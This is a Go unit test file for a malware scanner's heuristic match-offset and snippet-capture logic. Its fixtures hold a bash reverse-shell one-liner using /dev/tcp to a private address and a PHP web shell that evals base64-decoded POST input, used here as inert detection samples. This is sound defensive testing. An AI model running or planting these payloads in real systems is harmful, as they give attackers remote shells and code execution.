package scanner

import (
	"bytes"
	"testing"

	"aether/internal/report"
)

func TestHeuristicMatchOffset_KnownRules(t *testing.T) {
	script := []byte("#!/bin/bash\n# benign comment\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")

	off := heuristicMatchOffset("Script_Reverse_Shell_Interactive", script)
	if off < 0 || off >= len(script) {
		t.Fatalf("Script_Reverse_Shell_Interactive offset = %d, want within [0,%d)", off, len(script))
	}
	// The snippet built from the offset must land on the /dev/tcp line.
	sn := report.CaptureSnippet(script, off)
	if sn == nil {
		t.Fatal("expected snippet from reverse-shell offset")
	}
	if !bytes.Contains([]byte(sn.Lines[sn.MatchIndex].Text), []byte("/dev/tcp")) {
		t.Fatalf("match line %q does not contain /dev/tcp", sn.Lines[sn.MatchIndex].Text)
	}

	php := []byte("<?php\n$cmd = base64_decode($_POST['c']);\neval($cmd);\n")
	off = heuristicMatchOffset("Webshell_PHP_Generic_Backdoor", php)
	if off < 0 {
		t.Fatal("Webshell_PHP_Generic_Backdoor must produce an offset")
	}
	sn = report.CaptureSnippet(php, off)
	if sn == nil || !bytes.Contains([]byte(sn.Lines[sn.MatchIndex].Text), []byte("$_POST")) {
		t.Fatalf("webshell snippet did not land on the superglobal line: %+v", sn)
	}
}

func TestHeuristicMatchOffset_UnknownRule(t *testing.T) {
	if got := heuristicMatchOffset("Some_Unknown_Rule", []byte("anything")); got != -1 {
		t.Fatalf("unknown rule offset = %d, want -1", got)
	}
	if got := heuristicMatchOffset("Heuristic_ELF_In_Temp", []byte("ELF binary has no script regex")); got != -1 {
		t.Fatalf("non-script rule offset = %d, want -1", got)
	}
}

func TestHeuristicMatchOffset_NoMatchReturnsMinusOne(t *testing.T) {
	if got := heuristicMatchOffset("Script_Reverse_Shell_Interactive", []byte("totally benign")); got != -1 {
		t.Fatalf("non-matching data offset = %d, want -1", got)
	}
}
